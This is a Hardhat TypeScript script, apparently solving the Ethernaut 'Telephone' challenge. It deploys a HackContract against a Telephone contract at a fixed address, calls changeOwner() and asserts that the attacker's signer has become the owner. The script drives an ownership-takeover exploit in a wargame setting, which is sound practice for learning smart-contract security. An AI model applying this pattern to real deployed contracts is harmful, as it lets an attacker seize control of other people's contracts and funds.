import { ethers } from "hardhat";
import { HackContract__factory } from "../typechain/factories/HackContract__factory"
import { Telephone__factory } from "../typechain/factories/Telephone__factory"
import { HackContract } from "../typechain";
import { expect } from "chai";

async function main() {
  const [addr1] = await ethers.getSigners();
  const deployedAddress = '0x04377c459a2d669FbA4A3878bfcb850b1a1e16cd';
  const telephoneContract = Telephone__factory.connect(deployedAddress, addr1);
  console.log(await telephoneContract.owner());
  console.log(addr1.address);

  const hackContract: HackContract = await new HackContract__factory(addr1).deploy(deployedAddress);
  await hackContract.deployed();
  console.log("deployed :" + hackContract.address)
  await hackContract.changeOwner();
  const telephoneOwner: string = await telephoneContract.owner();
  console.log(telephoneOwner + " = " + addr1.address)
  expect(telephoneOwner).to.equal(addr1.address)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
